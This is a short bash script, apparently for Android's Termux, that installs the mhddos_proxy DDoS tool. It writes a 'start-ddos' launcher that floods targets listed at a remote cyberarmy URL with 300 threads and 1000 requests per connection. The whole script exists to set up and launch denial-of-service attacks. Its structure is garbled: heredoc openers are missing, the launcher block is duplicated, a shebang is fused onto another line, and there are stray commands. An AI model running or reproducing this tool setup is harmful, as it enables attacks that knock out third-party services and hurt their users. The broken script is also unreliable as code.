echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling mhdoos_proxy\033[0;0m\n"
apt update
apt upgrade -y -o
apt install -y python git
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling dependencies\033[0;0m\n"
pip install --upgrade pip
pip install wheel
pkg install rust
export CARGO_BUILD_TARGET=aarch64-linux-android
pip install pyOpenSSL
pip install -r termux_requirements.txt

cd ..
#!/usr/bin/env bash
cd mhddos_proxy
exec python runner.py -c https://targets.cyberarmy.com.ua/targets.txt -t 300 --rpc 1000 \$@
EOF
chmod +x start-ddos

set +xe#!/usr/bin/env bash
cd mhddos_proxy
exec python runner.py -c https://targets.cyberarmy.com.ua/targets.txt -t 300 --rpc 1000 \$@
EOF
chmod +x start-ddos

set +xe
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mTo start DDoS run ./start-ddos --debug\033[0;0m\n"